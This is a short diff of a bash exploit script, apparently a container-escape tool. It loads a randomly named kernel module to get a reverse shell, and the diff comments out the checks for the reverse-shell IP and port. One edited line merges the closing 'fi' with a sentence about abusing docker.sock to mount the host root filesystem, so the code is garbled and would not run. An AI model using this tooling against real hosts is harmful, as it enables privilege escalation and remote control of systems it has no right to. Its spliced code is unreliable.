@@ -34,15 +34,16 @@ exploitSysModule(){
     exit 1
   fi
 
-  if [ -z "$ip" ]; then
-    echo "[!] Missing reverse shell IP : use --ip"
-    exit 1
-  fi
 
-  if [ -z "$port" ]; then
-    echo "[!] Missing reverse shell port : use --port"
-    exit 1
-  fi
+#  if [ -z "$ip" ]; then
+#    echo "[!] Missing reverse shell IP"
+#    exit 1
+#  fi
+#
+#  if [ -z "$port" ]; then
+#    echo "[!] Missing reverse shell port"
+#    exit 1
+#  fi
 
   module_name=$(tr -dc A-Za-z </dev/urandom | head -c 13)
   sys_cwd=$(pwd)
@@ -96,7 +97,7 @@ EOF
   else
     echo "[!] Failed to mount module"
     exit 1
-  fi
+  fiAbusing docker.sock to create container which has the root file system mounted in it. With a reverse shell gaining access to the root file system.
 
   echo "[i] Cleaning up..."
 
